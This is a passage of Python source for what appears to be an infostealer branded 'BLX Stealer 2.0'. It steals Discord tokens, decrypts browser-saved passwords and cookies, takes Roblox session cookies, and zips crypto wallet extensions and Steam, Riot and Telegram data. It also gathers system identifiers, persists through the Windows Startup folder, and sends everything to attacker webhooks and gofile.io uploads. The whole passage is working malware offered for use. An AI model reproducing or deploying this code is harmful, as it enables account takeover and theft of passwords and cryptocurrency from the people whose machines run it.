            flags = flags % badge["Value"]

    return OwnedBadges

def G3770K3N1NF0(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"

    if "premium_type" in userjson: 
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<a:subscriber:1095725882250895481> "
        elif nitrot == 2:
            nitro = "<a:boost:1095740247540776991> <a:subscriber:1095725882250895481> "
    if "phone" in userjson: phone = f'`{userjson["phone"]}`'

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def CH3CK70K3N(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False


if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))
        
fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)

def UP104D70K3N(token, path):
    global hook
    global tgmx
# womp look at this shitty dual hook
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)

    if pfp == None: 
        pfp = "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    billing = G3781111N6(token)
    badge = G3784D63(flags)
    friends = G37UHQFr13ND5(token)
    if friends == '': friends = "No HQ Friends"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '': nitro = " -"

    data = {
        "content": f'{g108411NF0()} | Found in `{path}`',
        "embeds": [
            {
            "color": color,
            "fields": [
                {
                    "name": "<:hackerblack:1095747410539593800> Token:",
                    "value": f"`{token}`\n[Click To Copy](https://superfurrycdn.nl/copy/{token})"
                },
                {
                    "name": "<:mail:1095741024678191114> Email:",
                    "value": f"`{email}`",
                    "inline": True
                },
                {
                    "name": "<:phone:1095741029832990720> Phone:",
                    "value": f"{phone}",
                    "inline": True
                },
                {
                    "name": "<a:blackworld:1095741984385290310> IP:",
                    "value": f"`{g371P()}`",
                    "inline": True
                },
                {
                    "name": "<a:black_hypesquad:1095742323423453224> Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": "<a:blackmoneycard:1095741026850852965> Billing:",
                    "value": f"{billing}",
                    "inline": True
                },
                {
                    "name": "<:blackmember:1095740314683179139>  HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "BLX Stealer  2.0 antidualhook| remember dont follow skids",
                "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
        "username": "BLX Stealer  2.0 antidualhook| t.me/blxstealer",
        "attachments": []
        }
    L04DUr118(hook, data=dumps(data).encode(), headers=headers)
    L04DUr118(tgmx, data=dumps(data).encode(), headers=headers)
    
class PcInfo:
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    def __init__(self):
        self.get_inf(hook)

    def get_inf(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
    
    computer_os = platform.platform()
    mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    username = os.getenv("UserName")
    hostname = os.getenv("COMPUTERNAME")

    hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
    stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()

    cpu = wmi.WMI().Win32_Processor()[0]
    gpu = wmi.WMI().Win32_VideoController()[0]
    ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
    ip = requests.get('https://api.ipify.org').text

    data = {
            "content": g108411NF0(),
            "embeds": [
                {
                    "title": "BLX Stealer  2.0 antidualhook 2.0 antidualhook| System Info",
                    "description": f"<:userr:1164196007626670170> **PC Username:** `{username}`\n<:windowss:1164191405615362098> **PC Name:** `{hostname}`\n<:computerr:1164189052472393798> **OS:** `{computer_os}`\n\n<:blackworld:1164189050983415889> **IP:** `{ip}`\n<:wrenchh:1164189063306293358> **MAC:** `{mac}`\n<:keyy:1164192530456383529> **HWID:** `{hwid}`\n\n<:cpu:1164189055261605919> **CPU:** `{cpu.Name}`\n<:gpu:1164189947700453396> **GPU:** `{gpu.Name}`\n<:ramm:1164189059955036320> **RAM:** `{ram}GB`",
                    "color": color,
                    "footer": {
                        "text": "BLX Stealer  2.0 antidualhook| remember dont follow skids",
                        "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                    }
                }
            ],
            "username": "BLX Stealer  2.0 antidualhook| t.me/blxstealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
            "attachments": []
            }
    L04DUr118(hook, data=dumps(data).encode(), headers=headers)
    L04DUr118(tgmx, data=dumps(data).encode(), headers=headers)

# MADE BY 0x77ff | Thank you.

def edge_logger():
    try:
        rcookies = browser_cookie3.edge(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
    
        return rcookie
    except Exception as e:
        print(f"Error occurred in edge_logger: {str(e)}")
        return None
    
def chrome_logger():
    try:
        rcookies = browser_cookie3.chrome(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
    
        return rcookie
    except Exception as e:
        print(f"Error occurred in chrome_logger: {str(e)}")
        return None
    
def firefox_logger():
    try:
        rcookies = browser_cookie3.firefox(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
    
        return rcookie
    except Exception as e:
        print(f"Error occurred in firefox_logger: {str(e)}")
        return None
    
def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        return cookie
    except Exception as e:
        print(f"Error occurred in opera_logger: {str(e)}")
        return None  
    
def operagx_logger():
    try:
        rcookies = browser_cookie3.opera_gx(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        
        return rcookie
    except Exception as e:
        print(f"Error occurred in operagx_logger: {str(e)}")
        return None
        
def chromium_logger():
    try:
        rcookies = browser_cookie3.chromium(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
    
        return rcookie
    except Exception as e:
        print(f"Error occurred in chromium_logger: {str(e)}")
        return None    

roblochrome,robloedge,roblofire,robloopera,roblogx,roblochromium=chrome_logger(),edge_logger(),firefox_logger(),opera_logger(),operagx_logger(),chromium_logger()


headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

data = {
            "content": g108411NF0(),
            "embeds": [
                {
                    "title": "BLX Stealer  2.0 antidualhook| Roblox Information",
                    "description": f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}```\nOperaGX:```{roblogx}```\nChromium:```{roblochromium}```',
                    "color": color,
                    "footer": {
                        "text": "BLX Stealer  2.0 antidualhook| remember dont follow skids",
                        "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                    }
                }
            ],
            "username": "BLX Stealer  2.0 antidualhook| t.me/blxstealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
            "attachments": []
            }
L04DUr118(hook, data=dumps(data).encode(), headers=headers)
L04DUr118(tgmx, data=dumps(data).encode(), headers=headers)
    

def R3F0rM47(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def UP104D(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "lxcook":
        rb = ' | '.join(da for da in c00K1W0rDs)
        if len(rb) > 1000: 
            rrrrr = R3F0rM47(str(c00K1W0rDs))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": g108411NF0(),
            "embeds": [
                {
                    "title": "BLX Stealer  2.0 antidualhook| Cookies",
                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:blackmember:1095740314683179139>  • **{C00K1C0UNt}** Cookies Found \n <:blackarrow:1095740975197995041> • [BLXCookies.txt]({link})",
                    "color": color,
                    "footer": {
                        "text": "BLX Stealer  2.0 antidualhook| remember dont follow skids",
                        "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                    }
                }
            ],
            "username": "BLX Stealer  2.0 antidualhook| t.me/blxstealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
            "attachments": []
            }
        L04DUr118(hook, data=dumps(data).encode(), headers=headers)
        L04DUr118(tgmx, data=dumps(data).encode(), headers=headers)
        return

    if name == "lxpassw":
        ra = ' | '.join(da for da in p45WW0rDs)
        if len(ra) > 1000: 
            rrr = R3F0rM47(str(p45WW0rDs))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": g108411NF0(),
            "embeds": [
                {
                    "title": "BLX Stealer  2.0 antidualhook| Passwords",
                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1095740975197995041> • [BLXPasswords.txt]({link})",
                    "color": color,
                    "footer": {
                        "text": "BLX Stealer  2.0 antidualhook| remember dont follow skids",
                        "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                    }
                }
            ],
            "username": "BLX Stealer  2.0 antidualhook| t.me/blxstealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
            "attachments": []
            }
        L04DUr118(hook, data=dumps(data).encode(), headers=headers)
        L04DUr118(tgmx, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": g108411NF0(),
            "embeds": [
                {
                "color": color,
                "fields": [
                    {
                    "name": "I Found This Files;:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "BLX Stealer  2.0 antidualhook| Files"
                },
                "footer": {
                    "text": "BLX Stealer  2.0 antidualhook| remember dont follow skids",
                    "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                }
                }
            ],
            "username": "BLX Stealer  2.0 antidualhook| t.me/blxstealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
            "attachments": []
            }
        L04DUr118(hook, data=dumps(data).encode(), headers=headers)
        L04DUr118(tgmx, data=dumps(data).encode(), headers=headers)
        return

def wr173F0rF113(data, name):
    path = os.getenv("TEMP") + f"\lx{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--BLXStealer-->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

T0K3Ns = ''
def g3770K3N(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global T0K3Ns
                        if CH3CK70K3N(token):
                            if not token in T0K3Ns:
                                # print(token)
                                T0K3Ns += token
                                UP104D70K3N(token, path)


P455w = []
def g37P455W(path, arg):
    global P455w, P455WC0UNt
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "lx" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in k3YW0rd:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in p45WW0rDs: p45WW0rDs.append(old)
            P455w.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3CrYP7V41U3(row[2], master_key)}")
            P455WC0UNt += 1
    wr173F0rF113(P455w, 'passw')

C00K13s = []    
def g37C00K13(path, arg):
    global C00K13s, C00K1C0UNt
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "lx" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in k3YW0rd:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in c00K1W0rDs: c00K1W0rDs.append(old)
            C00K13s.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3CrYP7V41U3(row[2], master_key)}")
            C00K1C0UNt += 1
    wr173F0rF113(C00K13s, 'cook')

def G37D15C0rD(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines()if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global T0K3Ns
                    tokenDecoded = D3CrYP7V41U3(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if CH3CK70K3N(tokenDecoded):
                        if not tokenDecoded in T0K3Ns:
                            # print(token)
                            T0K3Ns += tokenDecoded
                            # writeforfile(Tokens, 'tokens')
                            UP104D70K3N(tokenDecoded, path)

def G47H3rZ1P5(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=Z1P73136r4M, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
        # print(WalletsZip, G4M1N6Z1p, OtherZip)

    wal, ga, ot = "",'',''
    if not len(W411375Z1p) == 0:
        wal = "<:ETH:975438262053257236> •  Wallets\n"
        for i in W411375Z1p:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(W411375Z1p) == 0:
        ga = "<:blackgengar:1111366900690202624>  •  Gaming\n"
        for i in G4M1N6Z1p:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(O7H3rZ1p) == 0:
        ot = "<:black_planet:1095740276850569226>  •  Apps\n"
        for i in O7H3rZ1p:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": g108411NF0(),
        "embeds": [
            {
            "title": "BLX Stealer  2.0 antidualhook| Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": color,
            "footer": {
                "text": "BLX Stealer  2.0 antidualhook| remember dont follow skids",
                "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
            }
            }
        ],
        "username": "BLX Stealer  2.0 antidualhook| t.me/blxstealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&",
        "attachments": []
    }
    L04DUr118(hook, data=dumps(data).encode(), headers=headers)
    L04DUr118(tgmx, data=dumps(data).encode(), headers=headers)


def Z1P73136r4M(path, arg, procc):
    global O7H3rZ1p
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uP104D7060F113(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    O7H3rZ1p.append([arg, lnik])

def Z1P7H1N65(path, arg, procc):
    pathC = path
    name = arg
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg

    if "ejbalbakoplchlghecdalmeeeajnimhm" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_Edge"
        pathC = path + arg

    if "djclckkglechooblngghdinmeemkbgci" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_OperaGX"
        pathC = path + arg

    if "fhbohimaelbohpjbbldcngcnapndodjp" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Binance_{browser}"
        pathC = path + arg

    if "hnfanknocfeofbddgcijnmhnfnkdnaad" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Coinbase_{browser}"
        pathC = path + arg

    if "egjidjbpglichdcondbcbdnbeeppgdph" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Trust_{browser}"
        pathC = path + arg

    if "bfnaelmomeimhlpmgjnjophhpkkoljpa" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Phantom_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uP104D7060F113(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg or "koplchlghecd" in arg or "aelbohpjbbld" in arg or "nocfeofbddgc" in arg or "bpglichdcond" in arg or "momeimhlpmgj" in arg:
        W411375Z1p.append([name, lnik])
    elif "Steam" in name or "RiotCli" in name:
        G4M1N6Z1p.append([name, lnik])
    else:
        O7H3rZ1p.append([name, lnik])
        

def G47H3r411():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    br0W53rP47H5 = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/djclckkglechooblngghdinmeemkbgci"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/djclckkglechooblngghdinmeemkbgci"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/djclckkglechooblngghdinmeemkbgci"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"              ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"              ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph"              ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",      "/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/ejbalbakoplchlghecdalmeeeajnimhm"              ]
    ]

    d15C0rDP47H5 = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    P47H570Z1P = [
        [f"{roaming}/Atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in br0W53rP47H5: 
        a = threading.Thread(target=g3770K3N, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in d15C0rDP47H5: 
        a = threading.Thread(target=G37D15C0rD, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in br0W53rP47H5: 
        a = threading.Thread(target=g37P455W, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in br0W53rP47H5: 
        a = threading.Thread(target=g37C00K13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=G47H3rZ1P5, args=[br0W53rP47H5, P47H570Z1P, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = TrU57(C00K13s)
    if DETECTED == True: return

    for thread in Threadlist: 
        thread.join()
    global uP7Hs
    uP7Hs = []

    for file in ["lxpassw.txt", "lxcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        UP104D(file.replace(".txt", ""), uP104D7060F113(os.getenv("TEMP") + "\\" + file))


def uP104D7060F113(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

def K1W1F01D3r(pathF, keywords):
    global K1W1F113s
    maxfilesperdir = 7
    i = 0
